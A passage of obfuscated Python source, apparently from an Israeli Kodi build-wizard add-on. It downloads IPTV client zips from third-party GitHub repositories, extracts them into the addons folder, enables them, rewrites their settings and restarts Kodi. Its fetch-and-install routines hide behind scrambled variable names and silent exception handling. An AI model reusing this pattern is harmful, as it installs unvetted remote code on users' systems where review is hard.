                    OO00OOO0OO0000O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0O0O000O00O0O0 ,OOO00000OO0O0OOO0 )#line:5958
                    O0O0OOO0OOOOOOO0O .update (int (O0OOO0OOO0000OOOO ),"Downloading "+'iptv',O000OOOOOOOO000O0 ,OO00OOO0OO0000O0O )#line:5960
              O0O000000O0000O00 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5963
              O000OO0O0O0OO0O0O .close ()#line:5966
              extract .all (OO000O00O000000O0 ,O0O000000O0000O00 ,O0O0OOO0OOOOOOO0O )#line:5967
              try :#line:5970
                os .remove (OO000O00O000000O0 )#line:5971
              except :#line:5973
                pass #line:5974
              O0O0OOO0OOOOOOO0O .close ()#line:5975
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:5978
              O00OOOO000O0OOOO0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:5980
              O000O000OOOOOOOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5981
              O0O0O00OOOO0OOO00 =xbmcgui .DialogProgress ()#line:5982
              O0O0O00OOOO0OOO00 .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5983
              OO000O00O000000O0 =os .path .join (O000O000OOOOOOOO0 ,'isr.zip')#line:5984
              O0OOOO0O000O0OO0O =urllib2 .Request (O00OOOO000O0OOOO0 )#line:5985
              OOOOO0OO0OOO0OOO0 =urllib2 .urlopen (O0OOOO0O000O0OO0O )#line:5986
              O0O0OOO0OOOOOOO0O =xbmcgui .DialogProgress ()#line:5988
              O0O0OOO0OOOOOOO0O .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5989
              O0O0OOO0OOOOOOO0O .update (0 )#line:5990
              O000OO0O0O0OO0O0O =open (OO000O00O000000O0 ,'wb')#line:5992
              try :#line:5994
                O0O0000O000OOO00O =OOOOO0OO0OOO0OOO0 .info ().getheader ('Content-Length').strip ()#line:5995
                O0O00O0OO00OOO0OO =True #line:5996
              except AttributeError :#line:5997
                    O0O00O0OO00OOO0OO =False #line:5998
              if O0O00O0OO00OOO0OO :#line:6000
                    O0O0000O000OOO00O =int (O0O0000O000OOO00O )#line:6001
              O0OO0OOOO0OOO00O0 =0 #line:6003
              OOO00OO00OO000000 =time .time ()#line:6004
              while True :#line:6005
                    OOO0O00O0OO0O0OOO =OOOOO0OO0OOO0OOO0 .read (8192 )#line:6006
                    if not OOO0O00O0OO0O0OOO :#line:6007
                        sys .stdout .write ('\n')#line:6008
                        break #line:6009
                    O0OO0OOOO0OOO00O0 +=len (OOO0O00O0OO0O0OOO )#line:6011
                    O000OO0O0O0OO0O0O .write (OOO0O00O0OO0O0OOO )#line:6012
                    if not O0O00O0OO00OOO0OO :#line:6014
                        O0O0000O000OOO00O =O0OO0OOOO0OOO00O0 #line:6015
                    if O0O0OOO0OOOOOOO0O .iscanceled ():#line:6016
                       O0O0OOO0OOOOOOO0O .close ()#line:6017
                       try :#line:6018
                        os .remove (OO000O00O000000O0 )#line:6019
                       except :#line:6020
                        pass #line:6021
                       break #line:6022
                    O0OOO0OOO0000OOOO =float (O0OO0OOOO0OOO00O0 )/O0O0000O000OOO00O #line:6023
                    O0OOO0OOO0000OOOO =round (O0OOO0OOO0000OOOO *100 ,2 )#line:6024
                    OOOOO0OO0000OOOOO =O0OO0OOOO0OOO00O0 /(1024 *1024 )#line:6025
                    O00OOOOO000OOOO0O =O0O0000O000OOO00O /(1024 *1024 )#line:6026
                    O000OOOOOOOO000O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOO0OO0000OOOOO ,'teal',O00OOOOO000OOOO0O )#line:6027
                    if (time .time ()-OOO00OO00OO000000 )>0 :#line:6028
                      OOO0O0O000O00O0O0 =O0OO0OOOO0OOO00O0 /(time .time ()-OOO00OO00OO000000 )#line:6029
                      OOO0O0O000O00O0O0 =OOO0O0O000O00O0O0 /1024 #line:6030
                    else :#line:6031
                     OOO0O0O000O00O0O0 =0 #line:6032
                    OOO00000OO0O0OOO0 ='KB'#line:6033
                    if OOO0O0O000O00O0O0 >=1024 :#line:6034
                       OOO0O0O000O00O0O0 =OOO0O0O000O00O0O0 /1024 #line:6035
                       OOO00000OO0O0OOO0 ='MB'#line:6036
                    if OOO0O0O000O00O0O0 >0 and not O0OOO0OOO0000OOOO ==100 :#line:6037
                        OO0000OOO000OO0OO =(O0O0000O000OOO00O -O0OO0OOOO0OOO00O0 )/OOO0O0O000O00O0O0 #line:6038
                    else :#line:6039
                        OO0000OOO000OO0OO =0 #line:6040
                    OO00OOO0OO0000O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0O0O000O00O0O0 ,OOO00000OO0O0OOO0 )#line:6041
                    O0O0OOO0OOOOOOO0O .update (int (O0OOO0OOO0000OOOO ),"Downloading "+'iptv',O000OOOOOOOO000O0 ,OO00OOO0OO0000O0O )#line:6043
              O0O000000O0000O00 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6046
              O000OO0O0O0OO0O0O .close ()#line:6049
              extract .all (OO000O00O000000O0 ,O0O000000O0000O00 ,O0O0OOO0OOOOOOO0O )#line:6050
              try :#line:6051
                os .remove (OO000O00O000000O0 )#line:6052
              except :#line:6054
                pass #line:6055
              O0O0OOO0OOOOOOO0O .close ()#line:6056
def iptvkodi17_18 ():#line:6057
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:6060
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6061
        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6062
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:6066
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6067
              OOO000O0O00O00000 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:6069
              OOO0OOOO0OO0O0O0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6070
              OOO0OO00000O00OO0 =xbmcgui .DialogProgress ()#line:6071
              OOO0OO00000O00OO0 .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6072
              OO0OO0O0O0O00000O =os .path .join (OOO0OOOO0OO0O0O0O ,'isr.zip')#line:6073
              O0O0OOOOOO0000OOO =urllib2 .Request (OOO000O0O00O00000 )#line:6074
              O0O00OO0O00O0000O =urllib2 .urlopen (O0O0OOOOOO0000OOO )#line:6075
              O0OOOOO0O0O00OO00 =xbmcgui .DialogProgress ()#line:6077
              O0OOOOO0O0O00OO00 .create ("Downloading","Downloading "+'iptv')#line:6078
              O0OOOOO0O0O00OO00 .update (0 )#line:6079
              OO0O000000O0O0O0O =open (OO0OO0O0O0O00000O ,'wb')#line:6081
              try :#line:6083
                O00OOOO0OO00OOOOO =O0O00OO0O00O0000O .info ().getheader ('Content-Length').strip ()#line:6084
                OO00OO0000000O0OO =True #line:6085
              except AttributeError :#line:6086
                    OO00OO0000000O0OO =False #line:6087
              if OO00OO0000000O0OO :#line:6089
                    O00OOOO0OO00OOOOO =int (O00OOOO0OO00OOOOO )#line:6090
              O00O0OOO00O00O00O =0 #line:6092
              O0OO00OOO00O0O0OO =time .time ()#line:6093
              while True :#line:6094
                    O0000OOOOOOO00OO0 =O0O00OO0O00O0000O .read (8192 )#line:6095
                    if not O0000OOOOOOO00OO0 :#line:6096
                        sys .stdout .write ('\n')#line:6097
                        break #line:6098
                    O00O0OOO00O00O00O +=len (O0000OOOOOOO00OO0 )#line:6100
                    OO0O000000O0O0O0O .write (O0000OOOOOOO00OO0 )#line:6101
                    if not OO00OO0000000O0OO :#line:6103
                        O00OOOO0OO00OOOOO =O00O0OOO00O00O00O #line:6104
                    if O0OOOOO0O0O00OO00 .iscanceled ():#line:6105
                       O0OOOOO0O0O00OO00 .close ()#line:6106
                       try :#line:6107
                        os .remove (OO0OO0O0O0O00000O )#line:6108
                       except :#line:6109
                        pass #line:6110
                       break #line:6111
                    O0O0OOO0O0OOO0OOO =float (O00O0OOO00O00O00O )/O00OOOO0OO00OOOOO #line:6112
                    O0O0OOO0O0OOO0OOO =round (O0O0OOO0O0OOO0OOO *100 ,2 )#line:6113
                    OOOOO0OO000O000O0 =O00O0OOO00O00O00O /(1024 *1024 )#line:6114
                    OOOOOO00O0O0OO0O0 =O00OOOO0OO00OOOOO /(1024 *1024 )#line:6115
                    OOOOOOO0O0O0OO00O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOO0OO000O000O0 ,'teal',OOOOOO00O0O0OO0O0 )#line:6116
                    if (time .time ()-O0OO00OOO00O0O0OO )>0 :#line:6117
                      OO0OOOO0O0000O0OO =O00O0OOO00O00O00O /(time .time ()-O0OO00OOO00O0O0OO )#line:6118
                      OO0OOOO0O0000O0OO =OO0OOOO0O0000O0OO /1024 #line:6119
                    else :#line:6120
                     OO0OOOO0O0000O0OO =0 #line:6121
                    OO0O0O0OOO0000O0O ='KB'#line:6122
                    if OO0OOOO0O0000O0OO >=1024 :#line:6123
                       OO0OOOO0O0000O0OO =OO0OOOO0O0000O0OO /1024 #line:6124
                       OO0O0O0OOO0000O0O ='MB'#line:6125
                    if OO0OOOO0O0000O0OO >0 and not O0O0OOO0O0OOO0OOO ==100 :#line:6126
                        OO000O0000O00OO0O =(O00OOOO0OO00OOOOO -O00O0OOO00O00O00O )/OO0OOOO0O0000O0OO #line:6127
                    else :#line:6128
                        OO000O0000O00OO0O =0 #line:6129
                    OOOO000OOOOOO0OO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0OOOO0O0000O0OO ,OO0O0O0OOO0000O0O )#line:6130
                    O0OOOOO0O0O00OO00 .update (int (O0O0OOO0O0OOO0OOO ),"Downloading "+'iptv',OOOOOOO0O0O0OO00O ,OOOO000OOOOOO0OO0 )#line:6132
              O00OOOOO0O00O00OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6135
              OO0O000000O0O0O0O .close ()#line:6138
              extract .all (OO0OO0O0O0O00000O ,O00OOOOO0O00O00OO ,O0OOOOO0O0O00OO00 )#line:6139
              wiz .kodi17Fix ()#line:6141
              try :#line:6143
                os .remove (OO0OO0O0O0O00000O )#line:6144
              except :#line:6146
                pass #line:6147
              O0OOOOO0O0O00OO00 .close ()#line:6148
              xbmc .sleep (5000 )#line:6150
              OOOOO00O00O0O0OO0 ='התקנת לקוח טלוויזיה חיה'#line:6152
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOO00O00O0O0OO0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6153
              resetkodi ()#line:6154
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6155
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:6156
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6157
              OOO000O0O00O00000 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:6158
              OOO0OOOO0OO0O0O0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6159
              OOO0OO00000O00OO0 =xbmcgui .DialogProgress ()#line:6160
              OOO0OO00000O00OO0 .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6161
              OO0OO0O0O0O00000O =os .path .join (OOO0OOOO0OO0O0O0O ,'isr.zip')#line:6162
              O0O0OOOOOO0000OOO =urllib2 .Request (OOO000O0O00O00000 )#line:6163
              O0O00OO0O00O0000O =urllib2 .urlopen (O0O0OOOOOO0000OOO )#line:6164
              O0OOOOO0O0O00OO00 =xbmcgui .DialogProgress ()#line:6166
              O0OOOOO0O0O00OO00 .create ("Downloading","Downloading "+'iptv')#line:6167
              O0OOOOO0O0O00OO00 .update (0 )#line:6168
              OO0O000000O0O0O0O =open (OO0OO0O0O0O00000O ,'wb')#line:6170
              try :#line:6172
                O00OOOO0OO00OOOOO =O0O00OO0O00O0000O .info ().getheader ('Content-Length').strip ()#line:6173
                OO00OO0000000O0OO =True #line:6174
              except AttributeError :#line:6175
                    OO00OO0000000O0OO =False #line:6176
              if OO00OO0000000O0OO :#line:6178
                    O00OOOO0OO00OOOOO =int (O00OOOO0OO00OOOOO )#line:6179
              O00O0OOO00O00O00O =0 #line:6181
              O0OO00OOO00O0O0OO =time .time ()#line:6182
              while True :#line:6183
                    O0000OOOOOOO00OO0 =O0O00OO0O00O0000O .read (8192 )#line:6184
                    if not O0000OOOOOOO00OO0 :#line:6185
                        sys .stdout .write ('\n')#line:6186
                        break #line:6187
                    O00O0OOO00O00O00O +=len (O0000OOOOOOO00OO0 )#line:6189
                    OO0O000000O0O0O0O .write (O0000OOOOOOO00OO0 )#line:6190
                    if not OO00OO0000000O0OO :#line:6192
                        O00OOOO0OO00OOOOO =O00O0OOO00O00O00O #line:6193
                    if O0OOOOO0O0O00OO00 .iscanceled ():#line:6194
                       O0OOOOO0O0O00OO00 .close ()#line:6195
                       try :#line:6196
                        os .remove (OO0OO0O0O0O00000O )#line:6197
                       except :#line:6198
                        pass #line:6199
                       break #line:6200
                    O0O0OOO0O0OOO0OOO =float (O00O0OOO00O00O00O )/O00OOOO0OO00OOOOO #line:6201
                    O0O0OOO0O0OOO0OOO =round (O0O0OOO0O0OOO0OOO *100 ,2 )#line:6202
                    OOOOO0OO000O000O0 =O00O0OOO00O00O00O /(1024 *1024 )#line:6203
                    OOOOOO00O0O0OO0O0 =O00OOOO0OO00OOOOO /(1024 *1024 )#line:6204
                    OOOOOOO0O0O0OO00O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOO0OO000O000O0 ,'teal',OOOOOO00O0O0OO0O0 )#line:6205
                    if (time .time ()-O0OO00OOO00O0O0OO )>0 :#line:6206
                      OO0OOOO0O0000O0OO =O00O0OOO00O00O00O /(time .time ()-O0OO00OOO00O0O0OO )#line:6207
                      OO0OOOO0O0000O0OO =OO0OOOO0O0000O0OO /1024 #line:6208
                    else :#line:6209
                     OO0OOOO0O0000O0OO =0 #line:6210
                    OO0O0O0OOO0000O0O ='KB'#line:6211
                    if OO0OOOO0O0000O0OO >=1024 :#line:6212
                       OO0OOOO0O0000O0OO =OO0OOOO0O0000O0OO /1024 #line:6213
                       OO0O0O0OOO0000O0O ='MB'#line:6214
                    if OO0OOOO0O0000O0OO >0 and not O0O0OOO0O0OOO0OOO ==100 :#line:6215
                        OO000O0000O00OO0O =(O00OOOO0OO00OOOOO -O00O0OOO00O00O00O )/OO0OOOO0O0000O0OO #line:6216
                    else :#line:6217
                        OO000O0000O00OO0O =0 #line:6218
                    OOOO000OOOOOO0OO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0OOOO0O0000O0OO ,OO0O0O0OOO0000O0O )#line:6219
                    O0OOOOO0O0O00OO00 .update (int (O0O0OOO0O0OOO0OOO ),"Downloading "+'iptv',OOOOOOO0O0O0OO00O ,OOOO000OOOOOO0OO0 )#line:6221
              O00OOOOO0O00O00OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6224
              OO0O000000O0O0O0O .close ()#line:6227
              extract .all (OO0OO0O0O0O00000O ,O00OOOOO0O00O00OO ,O0OOOOO0O0O00OO00 )#line:6228
              wiz .kodi17Fix ()#line:6229
              try :#line:6231
                os .remove (OO0OO0O0O0O00000O )#line:6232
              except :#line:6234
                pass #line:6235
              O0OOOOO0O0O00OO00 .close ()#line:6236
              xbmc .sleep (5000 )#line:6238
              OOOOO00O00O0O0OO0 ='התקנת לקוח טלוויזיה חיה'#line:6240
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOO00O00O0O0OO0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6241
              resetkodi ()#line:6242
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6244
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:6245
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6246
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6247
def iptvidanplus ():#line:6248
    O00OOO0OOO0OOO000 =xbmcaddon .Addon ('plugin.video.idanplus')#line:6249
    O00OOO0OOO0OOO000 .setSetting ('useIPTV','true')#line:6250
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.idanplus/?mode=7)")#line:6251
    if KODIV >=17 and KODIV <18 :#line:6254
        O00O00O000O0000O0 ='https://github.com/vip200/victory/blob/master/idanplus17.zip?raw=true'#line:6256
        OOOO00O0000OOO0O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6257
        OOOOOO0OO000OO00O =xbmcgui .DialogProgress ()#line:6258
        OOOOOO0OO000OO00O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6259
        O0OOO0O000O0000OO =os .path .join (PACKAGES ,'isr.zip')#line:6260
        OO0O0OO0OOO000O00 =urllib2 .Request (O00O00O000O0000O0 )#line:6261
        OO0OO0OOO00OOOO0O =urllib2 .urlopen (OO0O0OO0OOO000O00 )#line:6262
        O00O0OOOOOO00OO0O =xbmcgui .DialogProgress ()#line:6264
        O00O0OOOOOO00OO0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6265
        O00O0OOOOOO00OO0O .update (0 )#line:6266
        O0O000OO0O0O0OO00 =open (O0OOO0O000O0000OO ,'wb')#line:6268
        try :#line:6270
          OO00O00O000OO0000 =OO0OO0OOO00OOOO0O .info ().getheader ('Content-Length').strip ()#line:6271
          O0OOO0OOOOOO00OO0 =True #line:6272
        except AttributeError :#line:6273
              O0OOO0OOOOOO00OO0 =False #line:6274
        if O0OOO0OOOOOO00OO0 :#line:6276
              OO00O00O000OO0000 =int (OO00O00O000OO0000 )#line:6277
        OOO00000O000OO000 =0 #line:6279
        O0O0O00OO0000OO00 =time .time ()#line:6280
        while True :#line:6281
              O0OOO000000O0O000 =OO0OO0OOO00OOOO0O .read (8192 )#line:6282
              if not O0OOO000000O0O000 :#line:6283
                  sys .stdout .write ('\n')#line:6284
                  break #line:6285
              OOO00000O000OO000 +=len (O0OOO000000O0O000 )#line:6287
              O0O000OO0O0O0OO00 .write (O0OOO000000O0O000 )#line:6288
              if not O0OOO0OOOOOO00OO0 :#line:6290
                  OO00O00O000OO0000 =OOO00000O000OO000 #line:6291
              if O00O0OOOOOO00OO0O .iscanceled ():#line:6292
                 O00O0OOOOOO00OO0O .close ()#line:6293
                 try :#line:6294
                  os .remove (O0OOO0O000O0000OO )#line:6295
                 except :#line:6296
                  pass #line:6297
                 break #line:6298
              O0O0000OO0O0O0OOO =float (OOO00000O000OO000 )/OO00O00O000OO0000 #line:6299
              O0O0000OO0O0O0OOO =round (O0O0000OO0O0O0OOO *100 ,2 )#line:6300
              OO00OO000OOOOOO00 =OOO00000O000OO000 /(1024 *1024 )#line:6301
              O0OO0OO00OOOOO000 =OO00O00O000OO0000 /(1024 *1024 )#line:6302
              OOOO00O000O000000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00OO000OOOOOO00 ,'teal',O0OO0OO00OOOOO000 )#line:6303
              if (time .time ()-O0O0O00OO0000OO00 )>0 :#line:6304
                OOOOO00O0O0O0OOOO =OOO00000O000OO000 /(time .time ()-O0O0O00OO0000OO00 )#line:6305
                OOOOO00O0O0O0OOOO =OOOOO00O0O0O0OOOO /1024 #line:6306
              else :#line:6307
               OOOOO00O0O0O0OOOO =0 #line:6308
              O0OOO00O0000000O0 ='KB'#line:6309
              if OOOOO00O0O0O0OOOO >=1024 :#line:6310
                 OOOOO00O0O0O0OOOO =OOOOO00O0O0O0OOOO /1024 #line:6311
                 O0OOO00O0000000O0 ='MB'#line:6312
              if OOOOO00O0O0O0OOOO >0 and not O0O0000OO0O0O0OOO ==100 :#line:6313
                  O0OO00O0O0O000OOO =(OO00O00O000OO0000 -OOO00000O000OO000 )/OOOOO00O0O0O0OOOO #line:6314
              else :#line:6315
                  O0OO00O0O0O000OOO =0 #line:6316
              OO0O0OO0O00O00OOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOO00O0O0O0OOOO ,O0OOO00O0000000O0 )#line:6317
              O00O0OOOOOO00OO0O .update (int (O0O0000OO0O0O0OOO ),OOOO00O000O000000 ,OO0O0OO0O00O00OOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6319
        OO0OOOO0OOOO0OO0O =xbmc .translatePath (os .path .join ('special://home/'))#line:6322
        O0O000OO0O0O0OO00 .close ()#line:6325
        extract .all (O0OOO0O000O0000OO ,OO0OOOO0OOOO0OO0O ,O00O0OOOOOO00OO0O )#line:6326
        try :#line:6330
          os .remove (O0OOO0O000O0000OO )#line:6331
        except :#line:6332
          pass #line:6333
        wiz .kodi17Fix ()#line:6334
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6335
        time .sleep (10 )#line:6336
        O000OOO0O00O00OOO =xbmcaddon .Addon ('pvr.iptvsimple')#line:6337
        O000OOO0O00O00OOO .setSetting ('epgTimeShift','1.000000')#line:6338
        O000OOO0O00O00OOO .setSetting ('m3uPathType','0')#line:6339
        O000OOO0O00O00OOO .setSetting ('epgPathType','0')#line:6340
        O000OOO0O00O00OOO .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6341
        O000OOO0O00O00OOO .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')#line:6342
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]'%COLOR2 )#line:6343
        resetkodi ()#line:6344
    if KODIV >=18 :#line:6347
        iptvkodi18idan ()#line:6349
        wiz .kodi17Fix ()#line:6350
        time .sleep (10 )#line:6352
        O000OOO0O00O00OOO =xbmcaddon .Addon ('pvr.iptvsimple')#line:6353
        O000OOO0O00O00OOO .setSetting ('epgTimeShift','1.000000')#line:6354
        O000OOO0O00O00OOO .setSetting ('m3uPathType','0')#line:6355
        O000OOO0O00O00OOO .setSetting ('epgPathType','0')#line:6356
        O000OOO0O00O00OOO .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6357
        O000OOO0O00O00OOO .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')#line:6358
        OO0OOO0OO00OOOO0O ='הגדרת ערוצי עידן פלוס'#line:6359
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO0OO00OOOO0O ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6360
        resetkodi ()#line:6361
def iptvsimpldown ():#line:6377
    O00O0O0OO000O0OO0 =(IPTV18 )#line:6379
    O0OOOOOOOOO00OO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6380
    OOOO0O0OO0000000O =xbmcgui .DialogProgress ()#line:6381
    OOOO0O0OO0000000O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6382
    O0O00OOOOOO0OOO0O =os .path .join (PACKAGES ,'isr.zip')#line:6383
    OO00OOOO0O0OOO000 =urllib2 .Request (O00O0O0OO000O0OO0 )#line:6384
    O00OO000OO0O000O0 =urllib2 .urlopen (OO00OOOO0O0OOO000 )#line:6385
    O0000OOOO000O0O0O =xbmcgui .DialogProgress ()#line:6387
    O0000OOOO000O0O0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6388
    O0000OOOO000O0O0O .update (0 )#line:6389
    O0OO0O0O00O0OOO00 =open (O0O00OOOOOO0OOO0O ,'wb')#line:6391
    try :#line:6393
      OOO0OO0O0O0O000O0 =O00OO000OO0O000O0 .info ().getheader ('Content-Length').strip ()#line:6394
      OOOOO00OOOOO0000O =True #line:6395
    except AttributeError :#line:6396
          OOOOO00OOOOO0000O =False #line:6397
    if OOOOO00OOOOO0000O :#line:6399
          OOO0OO0O0O0O000O0 =int (OOO0OO0O0O0O000O0 )#line:6400
    O0OO0OO00O00OO0O0 =0 #line:6402
    OOOOO0O00OOO0OO0O =time .time ()#line:6403
    while True :#line:6404
          OOOOO0000O0O0O0OO =O00OO000OO0O000O0 .read (8192 )#line:6405
          if not OOOOO0000O0O0O0OO :#line:6406
              sys .stdout .write ('\n')#line:6407
              break #line:6408
          O0OO0OO00O00OO0O0 +=len (OOOOO0000O0O0O0OO )#line:6410
          O0OO0O0O00O0OOO00 .write (OOOOO0000O0O0O0OO )#line:6411
          if not OOOOO00OOOOO0000O :#line:6413
              OOO0OO0O0O0O000O0 =O0OO0OO00O00OO0O0 #line:6414
          if O0000OOOO000O0O0O .iscanceled ():#line:6415
             O0000OOOO000O0O0O .close ()#line:6416
             try :#line:6417
              os .remove (O0O00OOOOOO0OOO0O )#line:6418
             except :#line:6419
              pass #line:6420
             break #line:6421
          O0O0O00O000OO000O =float (O0OO0OO00O00OO0O0 )/OOO0OO0O0O0O000O0 #line:6422
          O0O0O00O000OO000O =round (O0O0O00O000OO000O *100 ,2 )#line:6423
          O0000O0OOO000OOO0 =O0OO0OO00O00OO0O0 /(1024 *1024 )#line:6424
          O0OO0OOOOO00000OO =OOO0OO0O0O0O000O0 /(1024 *1024 )#line:6425
          OOO0OO0OO0OOOOO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0000O0OOO000OOO0 ,'teal',O0OO0OOOOO00000OO )#line:6426
          if (time .time ()-OOOOO0O00OOO0OO0O )>0 :#line:6427
            OO0OO0OO00O0OO00O =O0OO0OO00O00OO0O0 /(time .time ()-OOOOO0O00OOO0OO0O )#line:6428
            OO0OO0OO00O0OO00O =OO0OO0OO00O0OO00O /1024 #line:6429
          else :#line:6430
           OO0OO0OO00O0OO00O =0 #line:6431
          O0O00O0OO0O000O0O ='KB'#line:6432
          if OO0OO0OO00O0OO00O >=1024 :#line:6433
             OO0OO0OO00O0OO00O =OO0OO0OO00O0OO00O /1024 #line:6434
             O0O00O0OO0O000O0O ='MB'#line:6435
          if OO0OO0OO00O0OO00O >0 and not O0O0O00O000OO000O ==100 :#line:6436
              O000O0OO0OO0OO0OO =(OOO0OO0O0O0O000O0 -O0OO0OO00O00OO0O0 )/OO0OO0OO00O0OO00O #line:6437
          else :#line:6438
              O000O0OO0OO0OO0OO =0 #line:6439
          O0000OOO0OOO0OO0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0OO0OO00O0OO00O ,O0O00O0OO0O000O0O )#line:6440
          O0000OOOO000O0O0O .update (int (O0O0O00O000OO000O ),OOO0OO0OO0OOOOO0O ,O0000OOO0OOO0OO0O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:6442
    OO000000OO000O000 =xbmc .translatePath (os .path .join ('special://home/'))#line:6445
    O0OO0O0O00O0OOO00 .close ()#line:6448
    extract .all (O0O00OOOOOO0OOO0O ,OO000000OO000O000 ,O0000OOOO000O0O0O )#line:6449
    try :#line:6453
      os .remove (O0O00OOOOOO0OOO0O )#line:6454
    except :#line:6455
      pass #line:6456
def telemedia_android5fix ():#line:6457
    OOOO00000O0OO000O =ADDON .getSetting ('systemtype')#line:6458
    OOO0O0O0O0OOO0O00 =ADDON .getSetting ('teleandro')#line:6459
    if xbmc .getCondVisibility ('system.platform.android')and 'Android 5'in OOOO00000O0OO000O or OOO0O0O0O0OOO0O00 =='true':#line:6460
        O00OO00OO000O00OO ='https://github.com/kodianonymous1/build/blob/master/tele.zip?raw=true'#line:6462
        O000OOOOO0O00O0O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6463
        OOOO0O00OOO0OO000 =xbmcgui .DialogProgress ()#line:6464
        OOOO0O00OOO0OO000 .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6465
        O0OOOO000O0OO00OO =os .path .join (PACKAGES ,'isr.zip')#line:6466
        O0O000OO000OO0OO0 =urllib2 .Request (O00OO00OO000O00OO )#line:6467
